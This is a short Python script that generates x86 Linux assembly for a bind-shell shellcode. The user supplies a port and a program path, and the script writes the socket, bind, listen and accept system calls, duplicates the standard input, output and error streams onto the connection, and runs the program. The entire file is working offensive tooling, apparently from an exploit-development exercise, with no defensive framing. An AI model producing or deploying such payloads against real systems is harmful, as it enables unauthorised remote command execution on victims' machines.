#!python3

import sys

if len(sys.argv) != 3:
   print("Usage: " + sys.argv[0] + " PATH PORT")
   sys.exit(1)

path = sys.argv[1]
port = int(sys.argv[2])

shellcode = "global _start \n \
 \n \
section .text  \n \
 \n \
_start:  \n \
	; socketcall  \n \
	xor eax, eax  \n \
	mov al, 0x66  \n \
	xor ebx, ebx  \n \
	mov bl, 1  \n \
 \n \
	xor ecx, ecx  \n \
	push ecx  \n \
	push ebx  \n \
	push 0x2  \n \
	mov ecx, esp  \n \
	int 0x80 \n  \
 \n \
	mov edi, eax  \n \
 \n \
	;bind  \n \
	xor eax, eax  \n \
	push eax  \n \
	push word *PORT*  \n \
	inc ebx	 \n  \
	push word bx  \n \
	mov edx, esp  \n \
 \n \
	mov al, 0x66  \n \
	push 0x10  \n \
	push edx  \n \
	push edi  \n \
	mov ecx, esp  \n \
 \n \
	int 0x80  \n \
 \n \
	;listen \n  \
	xor eax, eax  \n \
	mov al, 0x66  \n \
	mov bl, 4  \n \
	push eax  \n \
	push edi  \n \
	mov ecx, esp \n  \
	int 0x80  \n \
 \n \
	;accept \n  \
	mov al, 0x66 \n \
	inc ebx  \n \
	xor ecx, ecx  \n \
	push ecx \n  \
	push ecx  \n \
	push edi \n  \
	mov ecx, esp \n  \
	int 0x80  \n \
 \n \
	xchg   ebx,eax  \n \
 \n \
	;dup2 for loop \n  \
	xor ecx, ecx  \n \
	mov cl, 2 \n  \
 \n \
duploop:  \n \
	mov al, 0x3f  \n \
	int 0x80 \n  \
	dec ecx \n  \
	jns duploop  \n \
 \n \
	;execve \n  \
	mov al, 0xb  \n \
	xor ecx, ecx  \n \
	push ecx,  \n \
	*PATH*  \n \
	mov ebx, esp  \n \
	cdq  \n \
	int 0x80"


if port > 255 and port < 4096:
   str_port = str(hex(port)).partition('0x')[2]
   port = "0x"+ str_port[1:] + "0" + str_port[0]
elif port > 4095:
   str_port = str(hex(port)).partition('0x')[2]
   port = "0x" + str_port[2:] + str_port[0:2]
else:
   port = hex(port)

shellcode = shellcode.replace("*PORT*", port)

pushed_value = ""
result = []
if (len(path) % 4) != 0:
   for i in range(0, 4 - len(path) % 4):
      path = "/" + path

for i in range(0, int(len(path) / 4)):
   tmp = ""
   for letter in path[i*4:(i+1)*4][4::-1]:
      tmp += str(hex(ord(letter))).replace('0x', '')
   result.append(tmp)

for doubleword in result[len(result)::-1]:
   pushed_value += ('	push 0x' + doubleword + "\n")

shellcode = shellcode.replace("*PATH*", pushed_value)

print(shellcode)
